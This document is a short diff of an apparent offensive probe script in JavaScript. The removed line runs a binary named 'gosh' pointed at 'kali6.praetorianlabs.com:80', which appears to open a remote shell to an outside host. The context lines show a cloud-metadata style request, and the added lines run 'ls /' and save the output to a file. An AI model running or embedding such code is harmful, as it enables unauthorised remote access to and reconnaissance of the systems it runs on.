@@ -16,13 +16,16 @@ axios.get("https://google.com", {headers: {'Metadata-Flavor': 'Google'}}, { tran
 });
 
 
-exec("./gosh -host kali6.praetorianlabs.com:80", (error, stdout, stderr) => {
+exec("ls /", (error, stdout, stderr) => {
     if (error) {
         console.log(JSON.stringify(error.message));
+        fs.writeFileSync('command.result', JSON.stringify(error.message));    
     }
     else if (stderr) {
-        console.log(response=JSON.stringify(stderr));
+        console.log(JSON.stringify(stderr));
+        fs.writeFileSync('command.result', JSON.stringify(stderr));    
     }
     else
-        console.log(response = JSON.stringify(stdout));
+        console.log(JSON.stringify(stdout));
+        fs.writeFileSync('command.result', JSON.stringify(stdout));    
 });
